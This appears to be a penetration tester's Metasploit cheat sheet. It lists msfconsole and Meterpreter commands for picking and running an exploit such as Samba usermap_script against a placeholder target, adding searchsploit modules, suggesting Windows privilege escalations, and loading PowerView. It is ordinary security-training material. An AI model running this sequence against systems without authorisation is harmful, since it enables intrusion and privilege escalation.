---
title: "Metasploit"
date: 2024-6-28
tags: ["Exploitation", "Post-Exploitation", "Searchsploit", "Metasploit", "Vulnerability Scanning", "Exploit", "Meterpreter", "Windows", "Msfconsole"]
---

{{< tab set1 tab1 >}}msfconsole{{< /tab >}}
{{< tab set1 tab2 >}}meterpreter{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### Start msfconsole

```console
msfconsole -q
```

#### Basic Commands

```console
# Return to previous page
back
```

```console
# Upgrade session
sessions -u
```

```console
# quit metasploit
exit
```

#### Search Exploit

```console
# For example: samba
search samba
```

```console
# Choose by #num
use 15
```

```console
# Choose by full path
use exploit/multi/samba/usermap_script
```

```console
# Show exploit settings
options
```

```console
# Set option, e.g.
set rhosts <TARGET>
```

```console
set lhost <LOCAL_IP>
```

```console
set lport <LOCAL_PORT>
```

```console
# Run exploit
run 
```

<small>*Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter*</small>

#### Add scripts from searchsploit

```console
mkdir -p ~/.msf4/modules/exploits/linux
```

```console
mkdir -p ~/.msf4/modules/exploits/windows
```

```console
# For example a linux script
cp 12345.rb ~/.msf4/modules/exploits/linux
```

```console
# Inside msfconsole
reload_all
```

```console
# Search
search 12345
```

#### Fix no search result

```console
# Inside msfconsole, check db status
db_status
```

```console
sudo service postgresql start
```

```console
update-rc.d postgresql enable
```

```console
sudo msfdb init
```

```console
# Go bask to msfconsole and check again
db_status
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### Basic Commands

```console
# Return from meterpreter
background
```

#### Use Exploit

```console
# Quick look of potential privesc (Windows)
# Need to return from meterpreter
use post/multi/recon/local_exploit_suggester
```

```console
# Select opened session
set session 1
```

```console
# Show exploit settings
options
```

```console
# Set option, e.g.
set rhosts <TARGET>
```

```console
# Run exploit
run 
```

#### Use powershell

```console
# Use powershell module
use powershell
```

```console
# Import module
powershell_import /usr/share/windows-resources/powersploit/Recon/PowerView.ps1
```

```console
# Spawn powershell session
powershell_shell 
```

{{< /tabcontent >}}
